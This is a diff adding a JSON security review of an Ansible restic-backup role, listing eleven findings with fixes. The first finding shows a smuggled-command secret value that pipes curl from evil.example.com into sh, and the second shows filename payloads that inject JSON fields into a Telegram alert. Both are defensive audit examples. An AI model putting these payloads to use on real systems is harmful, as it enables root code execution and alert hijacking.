@@ -1,0 +1,121 @@
+{
+  "status": "changes_required",
+  "summary": {
+    "totalFindings": 11,
+    "critical": 2,
+    "major": 5,
+    "minor": 4
+  },
+  "findings": [
+    {
+      "severity": "critical",
+      "category": "A03: Injection",
+      "title": "Command injection via secret values sourced into shell",
+      "description": "/etc/restic/repo.env is rendered with `export RESTIC_PASSWORD=\"{{ restic_password }}\"` and similar lines, then sourced via `source /etc/restic/repo.env` in both fabric-backup.sh and backup-verify.sh, which run as root. Jinja2 does not escape shell metacharacters. If any sops-stored secret contains a double quote, dollar-sign, or backtick (e.g., a password generated with shell-unsafe symbols), the source command will execute embedded shell expressions as root. For example, restic_password=`a\"$(curl evil.example.com|sh)\"b` would yield arbitrary RCE on next backup run. The validate hook `bash -n` only catches gross syntax errors, not metacharacter escapes inside double-quoted strings.",
+      "location": "infrastructure/ansible/roles/restic-backups/templates/restic.env.j2:5-18; tasks/main.yml:67-75 (template render); fabric-backup.sh.j2:10; backup-verify.sh.j2:9",
+      "impact": "Root-level remote code execution on the backup host triggered by an attacker who can influence any of the sops-encrypted secret values (restic_password, restic_repository, restic_s3_access_key/secret_key, telegram_bot_token, telegram_ops_chat_id). Threat model: a compromised operator workstation pushing tampered sops content, supply-chain attack on a generated password, or human typo of an unsafe character.",
+      "recommendation": "Stop sourcing key=value pairs into bash. Either (a) render the file in `KEY=VALUE` format (no `export`, no quotes) and load with `set -a; . /etc/restic/repo.env; set +a` after escaping via Ansible's `quote` filter, or (b) better: render an `EnvironmentFile=/etc/restic/repo.env` directive in the systemd unit and rely on systemd's parser (which does NOT execute shell). Example: in restic.env.j2 use `RESTIC_PASSWORD={{ restic_password | quote }}` and read via systemd EnvironmentFile rather than `source`. Also forbid shell metacharacters at password-generation time.",
+      "cwe": "CWE-78"
+    },
+    {
+      "severity": "critical",
+      "category": "A03: Injection",
+      "title": "JSON injection in Telegram failure alert payload",
+      "description": "post_failure_alert() constructs the Telegram POST body by string-interpolating `${message}` directly into a JSON document: `\"text\": \"${message}\"`. The message contains `tail -20 \"${LOG_FILE}\"` output, which is raw restic stdout/stderr — file paths, error messages, snapshot IDs, hostnames. Any double-quote, backslash, or newline in that output breaks the JSON. Worse, a crafted filename (e.g., `\"snapshot_id\":\"fake\",\"chat_id\":\"attacker-id\"`) inside a backed-up directory could append additional JSON fields and redirect the alert to an attacker-controlled chat or smuggle arbitrary fields into the Bot API call. Also `parse_mode: Markdown` plus unsanitized log content can either reject the message (silent failure of alerting) or render with unexpected formatting.",
+      "location": "infrastructure/ansible/roles/restic-backups/templates/fabric-backup.sh.j2:54-63",
+      "impact": "(1) Silent alert loss when restic logs include `\"` or newlines, defeating the failure-monitoring guarantee called out in tech-spec TR8 and tasks/06.md edge case. (2) Adversarial filenames (e.g., an attacker drops a file named `\"; \"chat_id\":\"-1001234\"; \"x\":\"` inside /home/op/.fabric/) cause subsequent alerts to be routed elsewhere or to inject fields. (3) Possible exfil of failure context (which includes restic state) to attacker chat.",
+      "recommendation": "Build the JSON body with `jq -nc --arg chat \"$TELEGRAM_OPS_CHAT_ID\" --arg text \"$message\" '{chat_id:$chat,text:$text,parse_mode:\"MarkdownV2\"}'` and pipe via `--data-binary @-` to curl. Add `jq` to role dependencies. Additionally strip control characters and apply MarkdownV2 escaping (`sed 's/[_*\\[\\]()~`>#+\\-=|{}.!]/\\\\&/g'`) to the message before embedding. Limit `tail -20` to a known-safe text-only window (e.g., grep -v non-ASCII).",
+      "cwe": "CWE-91"
+    },
+    {
+      "severity": "major",
+      "category": "A04: Insecure Design",
+      "title": "Verification proves snapshot mountable, not that backed-up data is preserved",
+      "description": "backup-verify.sh restores the latest snapshot and asserts the SHA256 of a single static marker file (`/home/op/.fabric/backup-marker.txt`) equals a hard-coded expected hash (`53cffbb8...`). This only proves: (a) repo is reachable, (b) credentials work, (c) one file restored. It does NOT prove that vaultwarden, kaneo, or master-clones data were actually included — restic_paths could be misconfigured to back up only `/home/op/.fabric/` and verification still passes. Tech-spec D28 / AC42 demands 'verified test-restore'; current design satisfies the letter but not the intent.",
+      "location": "infrastructure/ansible/roles/restic-backups/templates/backup-verify.sh.j2:54-71",
+      "impact": "Operator gains false confidence that 'verify passes' means 'all data backed up'. Silent data loss for vaultwarden vault DB or kaneo DB would not be detected by verification. Combined with the retention-policy autopruning (forget --prune), corrupted/missing data would be permanently lost after 7+28+180 days.",
+      "recommendation": "Strengthen the verification: (1) place a per-source marker file in EACH backup root (`/opt/vaultwarden/.backup-marker`, `/opt/kaneo/.backup-marker`, `/home/op/code/mnemonic-masters/.backup-marker`, `/home/op/.fabric/backup-marker.txt`) and assert all are present in the snapshot with expected hashes; (2) additionally run `restic stats latest --mode raw-data` and assert size is within ±50% of the previous run (catch catastrophic regression); (3) on a weekly schedule run `restic check --read-data-subset=5%` for crypto integrity.",
+      "cwe": "CWE-754"
+    },
+    {
+      "severity": "major",
+      "category": "A04: Insecure Design",
+      "title": "Marker file in backup source is operator-writable, enabling verification bypass",
+      "description": "MARKER_SHA256_EXPECTED is hard-coded in the verify-script template as `53cffbb8a79a5265e9ed9c8d10b6cfe32d0b1be6c68a71b4ffc8f49c1a43c47e`. The marker file itself lives under `/home/op/.fabric/`, which the `op` user (and any agent worktree process) can write to. README §Backup Verification instructs the operator to generate the marker via `echo ... | sha256sum`. If an attacker with `op`-level access modifies the marker, the next backup captures the changed value; verification then fails because the captured SHA != expected. This is the intended tripwire — but the same attacker can simultaneously modify `/usr/local/bin/backup-verify.sh` (sudo not required if they have write to /usr/local/bin? — they don't; root-only). So the tripwire holds against `op` but a root attacker trivially bypasses. More importantly: the README workflow (generate hash, update the script) means the SHA256 reflects ONE original file. If verification fails after a legitimate marker rotation, operators may rationalize the failure ('oh, I rotated the marker but forgot to update the script') and ignore real corruption.",
+      "location": "infrastructure/ansible/roles/restic-backups/templates/backup-verify.sh.j2:12; README.md:95-102",
+      "impact": "Verification reliability degrades over time as operators tune out 'checksum mismatch' false-positives. Real data corruption then goes unnoticed. Documented marker rotation workflow conflicts with the tripwire purpose.",
+      "recommendation": "Make the marker immutable: render it via Ansible with mode 0444, owned by root, set `chattr +i` on it, and assert the hash matches at apply time. Compute the expected SHA256 from the rendered content inside Ansible (don't ask operators to update the script). Alternatively, replace marker-checksum verification with `restic check --read-data-subset=N%` plus per-source-root presence checks (see prior finding).",
+      "cwe": "CWE-345"
+    },
+    {
+      "severity": "major",
+      "category": "A09: Security Logging and Monitoring",
+      "title": "forget --prune lacks defensive bounds; misconfig can permanently delete all snapshots",
+      "description": "fabric-backup.sh runs `restic forget --keep-daily \"$KEEP_DAILY\" --keep-weekly \"$KEEP_WEEKLY\" --keep-monthly \"$KEEP_MONTHLY\" --prune` with values rendered from Jinja2 vars. The script does not validate that these values are non-zero integers before running. If an operator sets `restic_keep_daily: 0` (or accidentally empties the var via host_vars override), `restic forget` will prune snapshots older than 0 days — i.e., everything except the most recent. With `--prune`, the deletion is immediate and unrecoverable. There is also no `--dry-run` audit step, no logging of how many snapshots are about to be forgotten, and no abort-if-too-many-deletions guardrail.",
+      "location": "infrastructure/ansible/roles/restic-backups/templates/fabric-backup.sh.j2:96; defaults/main.yml:29-31",
+      "impact": "A single misconfiguration (or accidental host_vars merge) silently wipes the entire backup history on the next nightly run. The tech-spec AC42 requirement for a 7/4/6 retention is the ONLY safeguard against ransomware-style data destruction; eroding it eliminates the disaster-recovery posture.",
+      "recommendation": "Add explicit validation in the script before invoking forget: `[[ $KEEP_DAILY =~ ^[1-9][0-9]*$ ]] && [[ $KEEP_WEEKLY =~ ^[1-9][0-9]*$ ]] && [[ $KEEP_MONTHLY =~ ^[1-9][0-9]*$ ]] || { log_message 'FATAL: invalid retention values; refusing to forget'; exit 2; }`. Additionally run `restic forget --dry-run` first, parse the count of snapshots-to-delete, and abort if the count exceeds a sane bound (e.g., >50). Consider running `forget` without `--prune` from the backup script and have a separate weekly prune job so retention bugs are caught with a week's lag.",
+      "cwe": "CWE-697"
+    },
+    {
+      "severity": "major",
+      "category": "A08: Software and Data Integrity",
+      "title": "GitHub-release restic install relies on a single SHA256 without provenance verification",
+      "description": "tasks/main.yml lines 30-49 download the restic binary from `github.com/restic/restic/releases/.../linux_amd64.bz2` and verify only `sha256:{{ restic_github_sha256 }}`. The SHA256 is hard-coded in defaults/main.yml as `49b5c9b55f2f3bde9dfc47195d40f6af3d1f2dfa833fcc38f5da9d40bcc3b78f`. There is no verification of: (a) the upstream GPG signature, which restic ships (SHA256SUMS.asc signed by 0xCF8F18F2844575973F79D4E191A6868BD3F7A907), (b) SLSA provenance, (c) cosign attestation. The SHA256 in defaults is itself untrusted — any reviewer who can't independently verify it against restic's published checksums has to trust the commit author.",
+      "location": "infrastructure/ansible/roles/restic-backups/tasks/main.yml:30-36; defaults/main.yml:5-6",
+      "impact": "If GitHub releases are tampered with (compromised maintainer account, registry takeover) AND the SHA256 in our defaults was also updated by the same attacker via PR, a malicious restic binary runs as root, with access to the backup repository password — leading to full data exfiltration. Also blocks supply-chain audit trail.",
+      "recommendation": "Download `restic_{ver}_linux_amd64.bz2`, `SHA256SUMS`, and `SHA256SUMS.asc`; import restic's signing key (pinned by fingerprint in the role) into a temp gpg keyring; run `gpg --verify SHA256SUMS.asc SHA256SUMS`; verify the binary's SHA256 from the signed list rather than from a hard-coded value in defaults. Add a comment in defaults pointing to the upstream signed checksum URL so a reviewer can confirm 49b5c9b... matches. Alternatively prefer the apt path (which has its own signed package archive) and raise the minimum apt version requirement.",
+      "cwe": "CWE-494"
+    },
+    {
+      "severity": "major",
+      "category": "A05: Security Misconfiguration",
+      "title": "systemd ProtectHome=true conflicts with backup paths under /home (silent functional + monitoring failure)",
+      "description": "fabric-backup.service sets `ProtectHome=true`, which makes `/home` inaccessible to the unit. But `restic_paths` includes `/home/op/.fabric/` and `/home/op/code/mnemonic-masters/`, and `ReadWritePaths` is set to those paths. Per systemd docs, ReadWritePaths overrides ProtectSystem but does NOT override ProtectHome — for /home you need `ProtectHome=read-only` or `tmpfs` plus explicit `BindReadOnlyPaths=`. Result: restic will fail to read the home-rooted paths, but because the failure happens INSIDE `restic backup` (returning a permission error per-file), the script's retry loop will keep cycling, eventually post a failure alert (assuming finding #2 doesn't break the alert), and zero data from /home is captured. This is a security-relevant misconfiguration because it silently nullifies backups for the operator workspace and master clones — the very data the tech-spec D28 mandates we protect.",
+      "location": "infrastructure/ansible/roles/restic-backups/templates/fabric-backup.service.j2:13-19",
+      "impact": "Silent backup data loss for /home/op/.fabric/ and /home/op/code/mnemonic-masters/ — exactly the directories the disaster-recovery design is supposed to cover. Combined with finding #3 (verify only checks one marker), the failure is invisible.",
+      "recommendation": "Either remove `ProtectHome=true` (rely on root + ProtectSystem=strict + read-only access patterns) or set `ProtectHome=read-only` and add `BindReadOnlyPaths=/home/op/.fabric /home/op/code/mnemonic-masters`. Test in molecule by asserting `restic snapshots --json | jq '.[].paths'` contains all configured paths.",
+      "cwe": "CWE-732"
+    },
+    {
+      "severity": "minor",
+      "category": "A05: Security Misconfiguration",
+      "title": "telegram_ops_chat_id empty default causes silent loss of failure alerts",
+      "description": "defaults/main.yml leaves `telegram_bot_token` and `telegram_ops_chat_id` as empty strings. fabric-backup.sh only posts alerts when both are non-empty: `if [[ -n \"${TELEGRAM_BOT_TOKEN:-}\" ]] && [[ -n \"${TELEGRAM_OPS_CHAT_ID:-}\" ]]`. If sops doesn't supply them (typo, key rename), the role applies cleanly with no errors and backup failures will be invisible to operators forever.",
+      "location": "infrastructure/ansible/roles/restic-backups/defaults/main.yml:53-54; templates/fabric-backup.sh.j2:54",
+      "impact": "Silent alert-channel failure during disaster-relevant events. Violates the watchdog-alert intent of TR8.",
+      "recommendation": "Add an Ansible `assert` task that fails the play if `telegram_bot_token` or `telegram_ops_chat_id` is empty (and same for restic_repository / restic_password). Optional: emit a `[ALERT-DISABLED]` warning to journald inside the script when credentials are absent so an operator running `journalctl -u fabric-backup` sees the gap.",
+      "cwe": "CWE-778"
+    },
+    {
+      "severity": "minor",
+      "category": "A05: Security Misconfiguration",
+      "title": "Mixing notification credentials with backup credentials in /etc/restic/repo.env",
+      "description": "repo.env contains both restic credentials (RESTIC_PASSWORD, RESTIC_S3_*) AND Telegram credentials (TELEGRAM_BOT_TOKEN, TELEGRAM_OPS_CHAT_ID). Conceptually these belong to different blast radii: a leaked Telegram token lets an attacker spam ops but doesn't touch backups; a leaked restic_password decrypts the entire archive. Co-locating them means every read of repo.env (script bug, debug echo, accidental cat) leaks both.",
+      "location": "infrastructure/ansible/roles/restic-backups/templates/restic.env.j2:5-18",
+      "impact": "Increased blast radius if either category leaks. Telegram credentials are also used by other roles (telegram-init, telegram-ai-agent) — keeping a separate file would let those roles share telegram creds without exposing restic creds.",
+      "recommendation": "Split into `/etc/restic/repo.env` (RESTIC_* only, mode 0600) and `/etc/restic/alerts.env` (TELEGRAM_* only). Source both from the script. Better still: render the Telegram creds into a shared `/etc/fabric/telegram.env` owned by the telegram roles, and have restic source it.",
+      "cwe": "CWE-668"
+    },
+    {
+      "severity": "minor",
+      "category": "best-practice",
+      "title": "Backup-verify restore happens in shared /tmp without isolation from operator processes",
+      "description": "backup-verify.sh restores the latest snapshot to `/tmp/restore-test-${RESTORE_DATE}`. With `set -euo pipefail`, the restored directory exists for the duration of the script. The systemd-rendered service uses `PrivateTmp=true`, but `backup-verify.sh` is invoked manually per README (no systemd unit yet). When run manually as root, restored data — including a full copy of vaultwarden's encrypted DB and kaneo's DB — lives at predictable paths under shared /tmp readable by anyone with /tmp execute traverse. Other users on the box (the `op` user, agent worktree shells) cannot read root-mode files inside, but if PermissionsStartOnly is misused or umask is loose, world-readable copies could appear.",
+      "location": "infrastructure/ansible/roles/restic-backups/templates/backup-verify.sh.j2:13-22",
+      "impact": "Information disclosure risk on multi-user-adjacent hosts. On a single-operator VM with op-only access this is small, but defense-in-depth would matter once the fabric scales.",
+      "recommendation": "`mkdir -p \"${RESTORE_DIR}\" && chmod 0700 \"${RESTORE_DIR}\"` immediately after creation. Even better: restore into `/var/lib/restic-verify/` under root:root 0700 (rendered by Ansible). Trap on EXIT/INT/TERM (not just EXIT) to ensure cleanup on signal.",
+      "cwe": "CWE-732"
+    },
+    {
+      "severity": "minor",
+      "category": "best-practice",
+      "title": "Predictable temp log file path and missing log redaction before tail-to-Telegram",
+      "description": "fabric-backup.sh writes to `LOG_FILE=/tmp/restic-backup-$(date +%s).log` (predictable name; mitigated by systemd PrivateTmp). The script then `tail -20 \"${LOG_FILE}\"` and embeds it into the Telegram message. Restic logs include the full RESTIC_REPOSITORY URL (which for SFTP includes `user@host:/path` — server identity disclosure) and any error message that may echo back env vars on certain failure modes (e.g., `couldn't open repository: ssh: handshake failed: ...` with the full URL). The mnemonic-loop sanitizer module (T07) is not invoked here.",
+      "location": "infrastructure/ansible/roles/restic-backups/templates/fabric-backup.sh.j2:34, 50-52",
+      "impact": "Failure alerts sent to the ops Telegram topic disclose the backup repository hostname/path to anyone who can read that topic. If the topic is ever set to a group with non-ops members or the bot token leaks, infrastructure layout leaks too.",
+      "recommendation": "Before constructing the message, pipe through a redactor: `tail -20 \"$LOG_FILE\" | sed -E 's#(sftp:|s3:)[^ ]+#<redacted-repo>#g'`. Long-term: invoke the fabric sanitizer module (tech-spec T07) once it lands. Also store LOG_FILE under root-only `/var/log/restic-backup/` rather than /tmp so logs survive for post-mortem.",
+      "cwe": "CWE-532"
+    }
+  ]
+}
